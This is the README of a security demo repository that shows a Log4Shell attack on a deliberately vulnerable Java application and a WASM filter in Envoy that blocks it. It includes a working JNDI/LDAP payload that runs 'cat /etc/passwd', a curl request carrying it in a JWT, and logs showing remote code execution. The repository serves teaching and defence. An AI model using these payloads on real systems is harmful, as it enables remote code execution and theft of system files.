# ZTA and DevSecOps for Cloud Native Applications

This repository contains the materials for the *Service Mesh as the Security Kernel for Zero Trust Platforms*
demo presented at the NIST ZTA conference 2022.

## Contents

This demo contains three main applications:

* [log4shell-ldap](log4shell-ldap): A malicious LDAP server that can be used to exploit the `Log4Shell` CVEs.
* [vulnerable-app](vulnerable-app): An application that uses an old and unsecure Java runtime and a vulnerable
   version of the `log4j` library.
* [wasm-patch](wasm-patch): An [Envoy](https://www.envoyproxy.io/) [WASM extension](https://github.com/proxy-wasm/spec) written
  in Go using the [proxy-wasm-go-sdk](https://github.com/tetratelabs/proxy-wasm-go-sdk) that inspects requests and
  rejects those that contain `Log4Shell` payloads.

See the [hacking](#hacking) section for details about how to customize them.

## Build requirements

* [Go 1.17](https://go.dev/dl/) or higher.
* [TinyGo](https://tinygo.org/) to compile and build the WASM plugin.
* [kustomize](https://kustomize.io/) to deploy the applications in a Kubernetes cluster.

## Deploying to Kubernetes

The demo applications and services can be deployed to Kubernetes with `kustomize`:

```
kustomize build k8s/ | kubectl apply -f -
```

## Hacking

The behaviour of the applications can be customized by modifying the [GreetingsServlet.java](vulnerable-app/src/main/java/io/tetrate/log4shell/vulnerable/GreetingsServlet.java)
(vulnerable application) and the [Log4shellExploit.java](log4shell-ldap/exploit/src/main/java/io/tetrate/log4shell/exploit/Log4shellExploit.java) (exploit).

The current implementation of the exploit reads malicious LDAP lookup strings and parses a Base64-encoded command that is then executed. For example, the
malicious string `"${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}"` will instruct the exploit to execute a `cat /etc/passwd` command. The vulnerable
application logs the value of the `subject` claim in a JWT token, so if the malicious payload is set there, the exploit will be triggered.

### Running applications locally

The three applications can be easily run locally, although you won't be able to try all the [Istio](https://istio.io/)
features showcased in the demo. However, it is enough to get eh applications running and to be able to play with them
and the WASM plugin.

You can start he applications locally with:

```
make -C wasm-patch clean compile  # docker-compose needs the WASM binary to have been compiled
docker-compose build
docker-compose up
```

This will build the necessary images and start all them. The vulnerable application is exposed as follows:

* `http://localhost:8080` - Direct access tot eh vulnerable application.
* `http://localhost:8000` - Access through Envoy, which includes filtering with the WASM plugin.

To tst it, you can send a request to the application or Envoy proxy with a JWT Bearer token in the Authorization header.
The contents of the "sub" claim in the provided token will trigger the attack vector, if present. For example:

**Executing the requests directly against the vulnerable app**

```
$ curl http://localhost:8080
Welcome, anonymous!

$ curl http://localhost:8080 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE2NDI1ODI2MjIsImV4cCI6MTY3NDExODYyMiwiYXVkIjoid3d3LmV4YW1wbGUuY29tIiwic3ViIjoiJHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGw6MTM4OS9leGVjL1kyRjBJQzlsZEdNdmNHRnpjM2RrQ2c9PX0ifQ.ktEyOh8O3QMH6amqZtPsYHjtDeFVXmgKHLt-s0t2ckw"
Welcome, ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}!
```
We can see that the exploit was triggered by inspecting the vulnerable app logs:
```
log4shell_1   | received request from 192.168.160.3:37650
log4shell_1   | delivering malicious LDAP payload: {cn=pwned, exec/Y2F0IC9ldGMvcGFzc3dkCg== [{cn [pwned]} {javaClassName [io.tetrate.log4shell.exploit.Log4shellExploit]} {javaCodeBase [http://log4shell:3000/log4shell-exploit-1.0-SNAPSHOT.jar]} {objectclass [javaNamingReference]} {javaFactory [io.tetrate.log4shell.exploit.Log4shellExploit]}]}
vulnerable_1  | /!\ /!\ /!\ You have been pwned!
vulnerable_1  | /!\ /!\ /!\ RCE exploit loaded
vulnerable_1  | /!\ /!\ /!\ Executing: cat /etc/passwd
vulnerable_1  |
vulnerable_1  | root:x:0:0:root:/root:/bin/bash
vulnerable_1  | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
vulnerable_1  | bin:x:2:2:bin:/bin:/usr/sbin/nologin
vulnerable_1  | sys:x:3:3:sys:/dev:/usr/sbin/nologin
vulnerable_1  | sync:x:4:65534:sync:/bin:/bin/sync
vulnerable_1  | games:x:5:60:games:/usr/games:/usr/sbin/nologin
vulnerable_1  | man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
vulnerable_1  | lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
vulnerable_1  | mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
vulnerable_1  | news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
vulnerable_1  | uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
vulnerable_1  | proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
vulnerable_1  | www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
vulnerable_1  | backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
vulnerable_1  | list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
vulnerable_1  | irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
vulnerable_1  | gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
vulnerable_1  | nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
vulnerable_1  | systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
vulnerable_1  | systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
vulnerable_1  | systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
vulnerable_1  | systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
vulnerable_1  | messagebus:x:104:108::/var/run/dbus:/bin/false
vulnerable_1  |
vulnerable_1  | 13:40:09.410 [qtp1316061703-12] INFO  io.tetrate.log4shell.vulnerable.GreetingsServlet - welcoming user: pwned!
```

**Executing the requests against the Envoy proxy**

When running the requests through the proxy we can see the access being denied as the traffic is filtered by the WASM plugin.

```
$ curl http://localhost:8000
Welcome, anonymous!

$ curl http://localhost:8000 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE2NDI1ODI2MjIsImV4cCI6MTY3NDExODYyMiwiYXVkIjoid3d3LmV4YW1wbGUuY29tIiwic3ViIjoiJHtqbmRpOmxkYXA6Ly9sb2c0c2hlbGw6MTM4OS9leGVjL1kyRjBJQzlsZEdNdmNHRnpjM2RrQ2c9PX0ifQ.ktEyOh8O3QMH6amqZtPsYHjtDeFVXmgKHLt-s0t2ckw"
Access Denied
```
